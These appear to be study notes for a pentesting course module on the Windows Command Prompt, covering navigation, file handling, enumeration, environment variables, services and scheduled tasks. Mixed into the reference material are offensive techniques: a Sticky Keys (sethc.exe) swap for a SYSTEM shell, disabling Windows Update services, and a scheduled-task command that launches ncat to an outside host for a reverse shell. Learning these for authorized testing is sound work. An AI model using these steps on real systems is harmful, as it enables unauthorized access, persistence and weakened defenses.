Last Update: 2025-08-22 4:10 PM  
# Introduction
## Command Prompt Vs. PowerShell
| PowerShell                                                                 | Command Prompt (CMD)                                      |
| -------------------------------------------------------------------------- | --------------------------------------------------------- |
| Introduced in 2006                                                         | Introduced in 1981                                        |
| Can run both batch commands and PowerShell cmdlets                         | Can only run batch commands                               |
| Supports the use of command aliases                                        | Does not support command aliases                          |
| Cmdlet output can be passed to other cmdlets                               | Command output can be passed to other commands            |
| All output is in the form of an object                                     | Output of commands is text                                |
| Able to execute a sequence of cmdlets in a script                          | A command must finish before the next command can run     |
| Has an Integrated Scripting Environment (ISE)                              | Does not have an ISE                                      |
| Can access programming libraries because it is built on the .NET framework | Cannot access these libraries                             |
| Can be run on Linux systems                                                | Can only be run on Windows systems                        |
| Can run CMD commands                                                       | To run PowerShell commands precede them with `powershell` |

## Scenario
The scenario and context of this module (to help us understand better):
We are a system administrator looking to broaden our horizons and dip our toes into pentesting. Before we approach our manager and Internal Red Team Lead to see about apprenticing, we must first practice and gain a fundamental understanding of Windows primary command line interfaces: `PowerShell` and `Command Prompt`. Soon they will have no choice but to accept us as a certified `Command Line Ninja` and grant us a seat at the table.

# Command Prompt Basics
`cmd.exe` is the default command line interpreter for the Windows OS. Originally based on the [COMMAND.COM](https://www.techopedia.com/definition/1360/commandcom) interpreter in DOS. Ways to access it:
1. Windows + R then typing cmd.exe
2. Accessing it from `C:\Windows\System32\cmd.exe`
3. Remote access using protocols like: `telnet`(insecure), SSH, PsExec, WinRM and RDP

## Windows Recovery
In the case of a user lockout or other issue preventing regular use of the machine, booting from a windows installation disc gives you the option to boot to repair mode. From there you can access the command prompt and troubleshoot.  
![RecoveryMode](https://github.com/user-attachments/assets/fd7b531f-8d0b-4080-8c54-a34d5b57030c)

While useful, this also poses a potential risk. For example on some windows versions after opening CMD from repair mode we can replace the Sticky Keys (`sethc.exe`) binary with another copy of `cmd.exe`. 

Once the machine is rebooted, we can press `Shift` five times on the Windows login screen to invoke `Sticky Keys`. Since the executable has been overwritten, what we get instead is another Command Prompt - this time with `NT AUTHORITY\SYSTEM` permissions. We have bypassed any authentication and now have access to the machine as the super user.

# Getting Help
Help commands:
- `help`: prints a list of commands and a basic description of each.
- `help <command>`: gives details and important info about that command
Some commands will not display a help page but instead point you towards a useful command:
```cmd-session
C:\htb> help ipconfig

This command is not supported by the help utility. Try "ipconfig /?".
```
Be aware that several commands use the `/?` modifier interchangeably with help.

The help utility is extremely useful in gathering info about commands or getting the syntax for a command if you don't remember it, especially in cases where access to a network or the internet is limited, monitored or unavailable.

Additional help:
- [Microsoft Documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands) has a complete listing of the commands that can be issued within the command-line interpreter as well as detailed descriptions of how to use them. Think of it as an online version of the Man pages.
- [ss64](https://ss64.com/nt/) Is a handy quick reference for anything command-line related, including CMD, PowerShell, Bash, and more.

## Basic Tips & Tricks
`cls` clears the terminal, useful when it gets too crowded.  Even though we cleared the terminal previous commands still exist in our command history. The command history contains all commands that we used within this particular session. Below is a list of ways to interact with our command history, this list isn't exhaustive. For example F1 - F9 all serve a purpose when working with history even though we didn't mention all of them here.

|**Key/Command**|**Description**|
|:-:|---|
|doskey /history|doskey /history will print the session's command history to the terminal or output it to a file when specified.|
|page up|Places the first command in our session history to the prompt.|
|page down|Places the last command in history to the prompt.|
|⇧|Allows us to scroll up through our command history to view previously run commands.|
|⇩|Allows us to scroll down to our most recent commands run.|
|⇨|Types the previous command to prompt one character at a time.|
|⇦|N/A|
|F3|Will retype the entire previous entry to our prompt.|
|F5|Pressing F5 multiple times will allow you to cycle through previous commands.|
|F7|Opens an interactive list of previous commands.|
|F9|Enters a command to our prompt based on the number specified. The number corresponds to the commands place in our history.|
In CMD once a session ends its command history is deleted.

`Ctrl + C` kills the running process.

# System Navigation
## Listing a Directory
`dir` gives a listing of the directory we are currently in. We can use the `/A` switch to display files with specific attributes like `/A:R` for read-only files and `/A:H` for hidden files.

`cd` and `chdir` when we run them without arguments shows our current working directory. We can also use `cd <path>` (or `chdir`) to navigate to the directory in that path, both absolute paths and relative paths work.

We can also use `tree` to list the directories and subdirectories within our current directory or a directory we specify with a path. When followed by `/F` this command includes files in the listing.
```cmd-session
C:\htb\student\> tree /F

Folder PATH listing
Volume serial number is 26E7-9EE4
C:.
├───3D Objects
├───Contacts
├───Desktop
│       passwords.txt.txt
│       Project plans.txt
│       secrets.txt
│
├───Documents
├───Downloads
├───Favorites
│   │   Bing.URL
│   │
│   └───Links
├───Links
│       Desktop.lnk
│       Downloads.lnk
│
├───Music
├───OneDrive
├───Pictures
│   ├───Camera Roll
│   └───Saved Pictures
├───Saved Games
├───Searches
│       winrt--{S-1-5-21-1588464669-3682530959-1994202445-1000}-.searchconnector-ms
│
└───Videos
    └───Captures

    <SNIP>
```

## Moving Around Using cd and chdir
An absolute path is a path that starts with the root directory (the topmost directory in the structure, in our case `C:\`) and ends with the destination directory. For example `C:\Users\htb\Pictures` is an absolute path.

```cmd-session
C:\Users\htb> cd .\Pictures

C:\Users\htb\Pictures> 
```
The example above is using a relative path. The dot (`.`) refers to our current working directory (`C:\Users\htb`) followed by the directory within it (`\Pictures`) that we want to navigate to. We also have (`..`) which refers to the parent directory so:
```cmd-session
C:\Users\htb\Pictures>  cd ..\..\..\

C:\>
```

## Interesting Directories
A table of common directories that an attacker can abuse: 

|Name:|Location:|Description:|
|---|---|---|
|%SYSTEMROOT%\Temp|`C:\Windows\Temp`|Global directory containing temporary system files accessible to all users on the system. All users, regardless of authority, are provided full read, write, and execute permissions in this directory. Useful for dropping files as a low-privilege user on the system.|
|%TEMP%|`C:\Users\<user>\AppData\Local\Temp`|Local directory containing a user's temporary files accessible only to the user account that it is attached to. Provides full ownership to the user that owns this folder. Useful when the attacker gains control of a local/domain joined user account.|
|%PUBLIC%|`C:\Users\Public`|Publicly accessible directory allowing any interactive logon account full access to read, write, modify, execute, etc., files and subfolders within the directory. Alternative to the global Windows Temp Directory as it's less likely to be monitored for suspicious activity.|
|%ProgramFiles%|`C:\Program Files`|folder containing all 64-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system.|
|%ProgramFiles(x86)%|`C:\Program Files (x86)`|Folder containing all 32-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system.|

# Working with Directories and Files - CMD
## Creating and Deleting Directories
We can use `md` or `mkdir` followed by the directory name to make a new directory.  
`rd` and `rmdir` are used to delete a directory. For example:
```cmd-session
C:\Users\htb\Desktop> dir

 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop

06/15/2021  10:28 PM    <DIR>          .
06/15/2021  10:28 PM    <DIR>          ..
06/14/2021  10:37 PM                19 file.txt
06/15/2021  09:32 PM    <DIR>          Git-Pulls
06/15/2021  10:26 PM    <DIR>          new-directory
06/14/2021  10:59 PM                26 normal-file.txt
06/15/2021  09:29 PM    <DIR>          Notes
06/14/2021  10:28 PM                97 passwords.txt
06/14/2021  10:34 PM                97 Project plans.txt
06/14/2021  08:38 PM               114 secrets.txt
06/15/2021  09:29 PM    <DIR>          Work-Policies
06/15/2021  10:28 PM    <DIR>          yet-another-dir
               5 File(s)            353 bytes
               7 Dir(s)  38,634,733,568 bytes free

C:\Users\htb\Desktop> rd Git-Pulls
The directory is not empty.
```
The directory wouldn't get deleted because it isn't empty. In this case we can use `rd /S Git-Pulls` to delete it with its contents.

## Moving and Copying a Directory
```cmd-session
C:\Users\htb\Desktop> tree example /F

Folder PATH listing
Volume serial number is 00000032 DAE9:5896
C:\USERS\HTB\DESKTOP\EXAMPLE
│   file-1 - Copy.txt
│   file-1.txt
│   file-2.txt
│   file-3.txt
│   file-5.txt
│   ‎file-4.txt
│
└───more stuff

C:\Users\htb\Desktop> move example C:\Users\htb\Documents\example

        1 dir(s) moved.
```
First we ran `tree` to see the contents of the directory and then used `move <source> <destination>` to move said directory along with its contents there.

### Xcopy
```cmd-session
C:\Users\htb\Desktop> xcopy C:\Users\htb\Documents\example C:\Users\htb\Desktop\ /E

C:\Users\htb\Documents\example\file-1 - Copy.txt
C:\Users\htb\Documents\example\file-1.txt
C:\Users\htb\Documents\example\file-2.txt
C:\Users\htb\Documents\example\file-3.txt
C:\Users\htb\Documents\example\file-5.txt
C:\Users\htb\Documents\example\‎file-4.txt
6 File(s) copied
```
This command (`xcopy <source> <destination>`) copies the source directory and pastes it to the destination. The `/E` switch makes the command copy all files and subdirectories including empty ones.  
When copying xcopy will reset any attributes the file had, if you wish to retain them use the `/K` switch. `xcopy` works even with read-only and system files.

### Robocopy
It is xcopy's successor that is built with much more capabilities. We can use robocopy the same way we use other tools: `robocopy <source> <destination>`.
```cmd-session
C:\Users\htb\Desktop> robocopy /E /MIR /A-:SH C:\Users\htb\Desktop\notes\ C:\Users\htb\Documents\Backup\Files-to-exfil\

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows                    
-------------------------------------------------------------------------------

  Started : Monday, June 21, 2021 10:45:46 PM
   Source : C:\Users\htb\Desktop\notes\
     Dest : C:\Users\htb\Documents\Backup\Files-to-exfil\

    Files : *.*

  Options : *.* /S /E /DCOPY:DA /COPY:DAT /PURGE /MIR /A-:SH /R:1000000 /W:30

------------------------------------------------------------------------------

                           2    C:\Users\htb\Desktop\notes\
100%        New File                  16        python-notes
100%        New File                  13        vscode

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         2         2         0         0         0         0
   Bytes :        29        29         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Monday, June 21, 2021 10:45:46 PM


C:\Users\htb\Documents\Backup\Files-to-exfil>dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Documents\Backup\Files-to-exfil

06/21/2021  10:45 PM    <DIR>          .
06/21/2021  10:45 PM    <DIR>          ..
06/15/2021  09:29 PM                16 python-notes
06/15/2021  09:28 PM                13 vscode
               2 File(s)             29 bytes
               2 Dir(s)  38,285,676,544 bytes free
```
If we don't have sufficient permissions to copy a directory we can workaround this by using the option `/MIR`. These files could be marked as system or hidden preventing from accessing them. That's why we used `/A-:SH` to tell the command don’t mark files as system or hidden — and if they are, remove those attributes.  
Another interesting option is `/L` which tells the command to show us what would happen if we tried to run `robocopy` without actually copying anything.

## Viewing File Contents
`more <file>` can be used to view the content of a file. If that file has a lot of blank space we can compress the blank space with `/S` (the file isn't changed only how we view it).  
We can also use `<command> | more` to view the output of large commands one part at a time.

`openfiles` shows what files are open and which user is using them. This tool requires admin privileges and it can view open files, disconnect them and even kick users from accessing them. The ability to use it isn't enabled by default on windows.

`type` is another useful tool to view file contents (`type <file>`). We can even use it to view multiple files at once and redirect file content. For example `type file1.txt >> file2.txt` appends the content of file1 to the end of file2.

## Creating and Modifying Files
We can use `echo` to modify a file if it exists or create it if it doesn't exist.
```cmd-session
C:\Users\htb\Desktop>echo Check out this text > demo.txt

C:\Users\htb\Desktop>type demo.txt
Check out this text

C:\Users\htb\Desktop>echo More text for our demo file >> demo.txt

C:\Users\htb\Desktop>type demo.txt
Check out this text
More text for our demo file
```

`fsutil` has many uses but in our context we can use it to create a file: `fsutil file createNew <fileName> <fileSize>`.

`ren` allows changing the name of the file: `ren <oldName> <newName>`. `ren` and `rename` are the same command.

## Input / Output
Using `>` (as in `<command> > <file>`) we can create a file that contains the output of the command if the file doesn't exist. If it exists its content will be overwritten. To append to the file instead of overwriting it use: `>>`.

`<` can be used to pass a file as an input to a command, see this example:
```cmd-session
C:\Users\htb\Documents>type test.txt
a b c d e
f g h i j k see how this works now?

C:\Users\htb\Documents>find /i "see" < test.txt

f g h i j k see how this works now?
```
We fed `test.txt` to the find command and searched the file for the word see. The result was the line in which we found "see", this is extremely helpful in searching large files.

Another way to pass input is using the pipe (`<command1> | <command2>`) to pass the output of commands1 as input for command2 like we done here:
```cmd-session
C:\Users\htb\Documents>ipconfig /all | find /i "IPV4"

   IPv4 Address. . . . . . . . . . . : 172.16.146.5(Preferred)
```

we can use `<command1> & <command2>` to execute command1 then command2 regardless of whether command1 failed or not. On the other hand, `<command1> && <command2>` ensures that command1 is executed before executing command2, the same thing can be achieved by using `||`.

## Deleting Files
Both `del` and `erase` have the same usage. We can use them to delete a file (`del <file>`), a list of files (`del <file1> <file2>`).  
`del /A:R *`: deletes all (denoted by `*`) read-only files (`/A:R`).  
`del /A:H *`: deletes all (denoted by `*`) hidden files (`/A:H`).

## Copying and Moving Files
```cmd-session
C:\Users\student\Documents\Backup>copy secrets.txt C:\Users\student\Downloads\not-secrets.txt
        
        1 file(s) copied.
C:\Users\student\Downloads>dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\student\Downloads

06/23/2021  10:35 PM    <DIR>          .
06/23/2021  10:35 PM    <DIR>          ..
06/21/2021  11:58 PM             2,418 not-secrets.txt
               1 File(s)          2,418 bytes
               2 Dir(s)  39,021,146,112 bytes free
```
In this example we copied `secrets.txt` and pasted it in `C:\Users\student\Downloads\not-secrets.txt` and renamed it as `not-secrets.txt`. We can add `/V` to ensure files are copied correctly.

We can use `move` in files just like directories:
`move C:\Users\student\Desktop\bio.txt C:\Users\student\Downloads`

# Gathering System Information
Gathering system info (also known as host enumeration) is very important for pentesters. However doing that with no path or plan in mind will just result in wasted time and effort. If we want to know what to look for, first we have to understand types on info available on a system.

|Type|Description|
|---|---|
|`General System Information`|Contains information about the overall target system. Target system information includes but is not limited to the `hostname` of the machine, OS-specific details (`name`, `version`, `configuration`, etc.), and `installed hotfixes/patches` for the system.|
|`Networking Information`|Contains networking and connection information for the target system and system(s) to which the target is connected over the network. Examples of networking information include but are not limited to the following: `host IP address`, `available network interfaces`, `accessible subnets`, `DNS server(s)`, `known hosts`, and `network resources`.|
|`Basic Domain Information`|Contains Active Directory information regarding the domain to which the target system is connected.|
|`User Information`|Contains information regarding local users and groups on the target system. This can typically be expanded to contain anything accessible to these accounts, such as `environment variables`, `currently running tasks`, `scheduled tasks`, and `known services`.|

## System Info
`systeminfo` is useful in finding general info about the system such as hostname, IP address(es), if it belongs to a domain, what hotfixes have been installed, and much more. This is a good way to get an overall idea about the system while leaving minimal footprint, running one command is usually better than running 3 or 4 to get the same info.  

Quick access to things like OS version, hotfixes installed and OS build version can help us quickly determine with a google or [ExploitDB](https://www.exploit-db.com/) search if an exploit can be used to exploit this system further.

We can use commands like `hostname` to show the hostname of the machine and `ver` to show its OS version number. We can get both of these using `systeminfo` too but sometimes specific commands can be monitored more than others. This is why we need more than one established way to gather our required information and stay under the detection radar when possible.

## Network Info
`ipconfig` gives us basic network information like Domain Name, IPv4 Address, Subnet Mask, and Default Gateway. To get additional info use `ipconfig /all`.

The `arp` command displays the entries within the Address Resolution Protocol (ARP) cache. This information is useful in determining what hosts our target was communicating with.

## Current User Info
`whoami` is useful when looking for info about our current user. Running it without parameters will output the current domain and the user name of the logged-in account. Running it with `/priv` gives us the privileges of our user.

Knowing what groups this user is a part of is important since that may grant him additional permissions, view these groups using `whoami /groups`. There is also `whoami /all` which shows all info that the `whoami` command can display.

## Other Users/Groups
`net user` displays a list of all users on a host, information about a specific user, and creates or deletes users.

`net group` displays any groups that exist on the host from which we issued the command, creates and deletes groups, and adds or removes users from groups. It will also display domain group info if the host is joined to the domain. Keep in mind, `net group` must be run against a domain server such as the DC, while `net localgroup` can be run against any host to show us the groups it contains.

`net share` displays info about shared resources on the host and allows creating new shared resources as well. What concerns us about shares is mostly:
- Do we have the proper permissions to access this share?
- Can we read, write, and execute files on the share?
- Is there any valuable data on the share?

`net view` will display to us any shared resources the host you are issuing the command against knows of. This includes domain resources, shares, printers, and more.

# Finding Files and Directories
## where
```cmd-session
C:\Users\student\Desktop>where calc.exe

C:\Windows\System32\calc.exe

C:\Users\student\Desktop>where bio.txt

INFO: Could not find files for the given pattern(s).
```
In the above example we used `where` to try and get the location of `calc.exe` and `bio.txt` The first one worked because `System32` is in the environment variable path and the `where` command looks through these folders automatically.

The other one failed since the file doesn't exist within the environment path nor the current working directory, it is in our user directory. So we need to specify the path to search in and use `/R` to ensure we search through all folders in that path.
```cmd-session
C:\Users\student\Desktop>where /R C:\Users\student\ bio.txt

C:\Users\student\Downloads\bio.txt
```

We can also use wildcards in our search like: `where /R C:\Users\student\ *.csv` which searches for any `csv` file.

## find
We can use `find` to search for a string within a file, a list of files or a command output. Example: `find "password" "C:\Users\student\not-passwords.txt"` searches for the word password within `not-passwords.txt`. There is a number of useful switches for this command like:
- `/V`: change the search from a matching clause to a not matching clause
- `/N`: displays line numbers with each line
- `/I`: ignores case sensitivity

The more advanced version of `find` is `findstr` which supports matching patterns, regex values, wildcards and more. It is similar to `grep` from Linux.

## Sorting and Comparing Files
### Comparing
`Comp` will check each byte within two files looking for differences and then displays where they start. By default, the differences are shown in a decimal format. We can use the `/A` modifier if we want to see the differences in ASCII format. The `/L` modifier can also provide us with the line numbers.
```cmd-session
C:\Users\student\Desktop> comp .\file-1.md .\file-2.md

Comparing .\file-1.md and .\file-2.md...
Files compare OK  
```
In this example the result was OK so the files are the same. This is an easy way to check if any file or executable was modified.

In the following example we have `file-1.md` which contains the letter "a" and `file-2.md` which contains the letter "b".
```powershell-session
PS C:\Users\MTanaka\Desktop> comp .\file-1.md .\file-2.md /A
Comparing .\file-1.md and .\file-2.md...
Compare error at OFFSET 2
file1 = a
file2 = b  
```
When comparing them the command tells us that they are different.

`fc` is another command to compare files but it's much easier to interpret and has a clear output.

### Sorting
`sort` is a useful command that can receive input from the console, pipeline or a file and then sort it, it is often used with pipeline operators such as `|`, `<`, and `>`.

# Environment Variables
Environment variables are settings that are often applied globally to our hosts. In windows, environment variables aren't case sensitive and can have spaces and numbers in the name but it can't start with a number or include an equal (=) sign.

When referenced variables are called between two (\%%) signs like: `%PATH%`.

## Variable Scope
In this context, `Scope` is a programming concept that refers to where variables can be accessed or referenced.
- Global scope variables: global variables are accessible globally.
- Local scope variables: these variables are only accessible from within a local context which is the context they were declared in.
```cmd-session
C:\Users\alice> echo %WINDIR%

C:\Windows
```

```cmd-session
C:\Users\bob> echo %WINDIR%

C:\Windows
```
In both of these sessions above, two different users using the same machine were able to view the content of the variable since it was a global one.

```cmd-session
C:\Users\alice> set SECRET=HTB{5UP3r_53Cr37_V4r14813}

C:\Users\alice> echo %SECRET%
HTB{5UP3r_53Cr37_V4r14813}
```

```cmd-session
C:\Users\bob> echo %SECRET%
%SECRET%

C:\Users\bob> set %SECRET%
Environment variable %SECRET% not defined
```
This time `alice` created a local variable named SECRET. Since it's a local variable `bob` couldn't view it.  
Scopes used in windows environment variables:

| Scope              | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | Permissions Required to Access                                    | Registry Location                                                                 |
| ------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------- | --------------------------------------------------------------------------------- |
| `System (Machine)` | The System scope contains environment variables defined by the Operating System (OS) and are accessible globally by all users and accounts that log on to the system. The OS requires these variables to function properly and are loaded upon runtime.                                                                                                                                                                                                                                   | Local Administrator or Domain Administrator                       | `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment` |
| `User`             | The User scope contains environment variables defined by the currently active user and are only accessible to them, not other users who can log on to the same system.                                                                                                                                                                                                                                                                                                                    | Current Active User, Local Administrator, or Domain Administrator | `HKEY_CURRENT_USER\Environment`                                                   |
| `Process`          | The Process scope contains environment variables that are defined and accessible in the context of the currently running process. Due to their transient nature, their lifetime only lasts for the currently running process in which they were initially defined. They also inherit variables from the System/User Scopes and the parent process that spawns it (only if it is a child process). `Process` scope is considered to be a sub-scope of both the `System` and `User` scopes. | Current Child Process, Parent Process, or Current Active User     | `None (Stored in Process Memory)`                                                 |

## Viewing and Editing Environment Variables
As we have seen before `echo %VARIABLE%` can be used to view the content of that variable. `set` can be used in a similar way as `echo` to display content if we don't use an equal (=) sign to edit that variable.

As for editing variables we can do it with `set` or `setx`. The main difference is that changes made by `set` aren't permanent and only apply to the current command line session while `setx` makes permanent changes. In the following examples we will be using `setx`.  
To create: `setx <VariableName> <value>`, the same command can be used to replace the old value with a new one.  
To remove: set the value to nothing using `setx <VariableName> ""`.

## Important Environment Variables
| Variable Name         | Description                                                                                                                                                                                                                                                                               |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `%PATH%`              | Specifies a set of directories(locations) where executable programs are located.                                                                                                                                                                                                          |
| `%OS%`                | The current operating system on the user's workstation.                                                                                                                                                                                                                                   |
| `%SYSTEMROOT%`        | Expands to `C:\Windows`. A system-defined read-only variable containing the Windows system folder. Anything Windows considers important to its core functionality is found here, including important data, core system binaries, and configuration files.                                 |
| `%LOGONSERVER%`       | Provides us with the login server for the currently active user followed by the machine's hostname. We can use this information to know if a machine is joined to a domain or workgroup.                                                                                                  |
| `%USERPROFILE%`       | Provides us with the location of the currently active user's home directory. Expands to `C:\Users\{username}`.                                                                                                                                                                            |
| `%ProgramFiles%`      | Equivalent of `C:\Program Files`. This location is where all the programs are installed on an `x64` based system.                                                                                                                                                                         |
| `%ProgramFiles(x86)%` | Equivalent of `C:\Program Files (x86)`. This location is where all 32-bit programs running under `WOW64` are installed. Note that this variable is only accessible on a 64-bit host. It can be used to indicate what kind of host we are interacting with. (`x86` vs. `x64` architecture) |
A complete list can be found [here](https://ss64.com/nt/syntax-variables.html).

# Managing Services
`sc` is a windows executable utility that allows us to query, modify, and manage services.  
To see all active services: `sc query type= service`
To see if a specific service is running: `sc query <service>` (i.e. `sc query windefend`)
To stop a service: `sc stop <service>`

Be careful when attempting to stop a service like windows defender (`windefend`) you won't be allowed to do that since this particular service can only be stopped by the [SYSTEM](https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts#default-local-system-accounts) machine account, even an admin can't stop it so your attempt will only fill system logs and alert the blue team about your presence. Make sure to know what services can be stopped by a regular user, what needs an admin and what can only be stopped by the system.

To start a service: `sc start <service>`

## Modifying Services
Attackers hugely benefit from modifying services to serve their interests. In some cases, we can change them to be disabled at startup or modify the service's path to the malicious binary itself. In the following example we will try to prevent windows from updating itself.

Windows updates rely on `wuauserv` (Windows Update Service) and `bits` (Background Intelligent Transfer Service) so those are the ones we will work on. First of all we need to query them:
```cmd-session
C:\WINDOWS\system32> sc query wuauserv

SERVICE_NAME: wuauserv
        TYPE               : 30  WIN32
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\WINDOWS\system32> sc query bits

SERVICE_NAME: bits
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_PRESHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```
`wuauserv` is currently stopped since the system isn't updating. However `bits` is running so we can stop it using `sc stop bits`. After stopping it we can modify the start type for both of them:
```cmd-session
C:\WINDOWS\system32> sc config wuauserv start= disabled

[SC] ChangeServiceConfig SUCCESS

C:\WINDOWS\system32> sc config bits start= disabled

[SC] ChangeServiceConfig SUCCESS
```
Now when these services attempt to start they won't be able to do it (even when using `sc start`) so the system now won't be able to update itself. To revert everything to normal set `start= auto`.

## tasklist
[Tasklist](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist) is a command line tool that gives us a list of currently running processes. However, we can use `tasklist /svc` to get a full listing of processes that are currently running on the system, their respective `PID`, and what service(s) are hosted under each process.

## net start
`net start` allows us to quickly list all of the current running services on a system. In addition to `net start`, there is also `net stop`, `net pause`, and `net continue`. These will behave very similarly to `sc` as we can provide the name of the service afterward and be able to perform the actions specified in the command against the service that we provide.

## wmic
To list all services existing on our system and information on them, regardless of whether or not it is currently running.: `wmic service list brief`.  
**Note:** It is important to be aware that the `WMIC` command-line utility is currently deprecated.

# Working With Scheduled Tasks
## Triggers That Can Kick Off a Scheduled Task
- When a specific system event occurs.
- At a specific time.
- At a specific time on a daily schedule.
- At a specific time on a weekly schedule.
- At a specific time on a monthly schedule.
- At a specific time on a monthly day-of-week schedule.
- When the computer enters an idle state.
- When the task is registered.
- When the system is booted.
- When a user logs on.
- When a Terminal Server session changes state.

## Query a Scheduled Task
We will utilize `schtasks` to query (`schtasks /Query`), create (`schtasks /Create`), modify (`schtasks /Change`) and delete tasks (`schtasks /Delete`). With each action a table will be provided that contains some useful parameters.

|**Action**|**Parameter**|**Description**|
|---|---|---|
|`Query`||Performs a local or remote host search to determine what scheduled tasks exist. Due to permissions, not all tasks may be seen by a normal user.|
||/fo|Sets formatting options. We can specify to show results in the `Table, List, or CSV` output.|
||/v|Sets verbosity to on, displaying the `advanced properties` set in displayed tasks when used with the List or CSV output parameter.|
||/nh|Simplifies the output using the Table or CSV output format. This switch `removes` the `column headers`.|
||/s|Sets the DNS name or IP address of the host we want to connect to. `Localhost` is the `default` specified. If `/s` is utilized, we are connecting to a remote host and must format it as "\\host".|
||/u|This switch will tell schtasks to run the following command with the `permission set` of the `user` specified.|
||/p|Sets the `password` in use for command execution when we specify a user to run the task. Users must be members of the Administrator's group on the host (or in the domain). The `u` and `p` values are only valid when used with the `s` parameter.|

## Create
| **Action** | **Parameter** | **Description**                                                                                                               |
| ---------- | ------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| `Create`   |               | Schedules a task to run.                                                                                                      |
|            | /sc           | Sets the schedule type. It can be by the minute, hourly, weekly, and much more. Be sure to check the options parameters.      |
|            | /tn           | Sets the name for the task we are building. Each task must have a unique name.                                                |
|            | /tr           | Sets the trigger and task that should be run. This can be an executable, script, or batch file.                               |
|            | /s            | Specify the host to run on, much like in Query.                                                                               |
|            | /u            | Specifies the local user or domain user to utilize                                                                            |
|            | /p            | Sets the Password of the user-specified.                                                                                      |
|            | /mo           | Allows us to set a modifier to run within our set schedule. For example, every 5 hours every other day.                       |
|            | /rl           | Allows us to limit the privileges of the task. Options here are `limited` access and `Highest`. Limited is the default value. |
|            | /z            | Will set the task to be deleted after completion of its actions.                                                              |
At a minimum, we must specify the following:
- `/create` : to tell it what we are doing
- `/sc` : we must set a schedule
- `/tn` : we must set the name
- `/tr` : we must give it an action to take
Everything else is optional. Let us see an example below of how we could create a task to help us get a shell.
```cmd-session
C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"

SUCCESS: The scheduled task "My Secret Task" has successfully been created.
```
In our example above, we have `schtasks` execute `Ncat` locally, which we placed in the user's `AppData` directory, and connect to the host `172.16.1.100` on port `8100`. If successfully executed, this connection request should connect to our command and control framework (Metasploit, Empire, etc.) and give us shell access.

## Change
| **Action** | **Parameter** | **Description**                                    |
| ---------- | ------------- | -------------------------------------------------- |
| `Change`   |               | Allows for modifying existing scheduled tasks.     |
|            | /tn           | Designates the task to change                      |
|            | /tr           | Modifies the program or action that the task runs. |
|            | /ENABLE       | Change the state of the task to Enabled.           |
|            | /DISABLE      | Change the state of the task to Disabled.          |

## Delete
| **Action** | **Parameter** | **Description**                                           |
| ---------- | ------------- | --------------------------------------------------------- |
| `Delete`   |               | Remove a task from the schedule                           |
|            | /tn           | Identifies the task to delete.                            |
|            | /s            | Specifies the name or IP address to delete the task from. |
|            | /u            | Specifies the user to run the task as.                    |
|            | /p            | Specifies the password to run the task as.                |
|            | /f            | Stops the confirmation warning.                           |
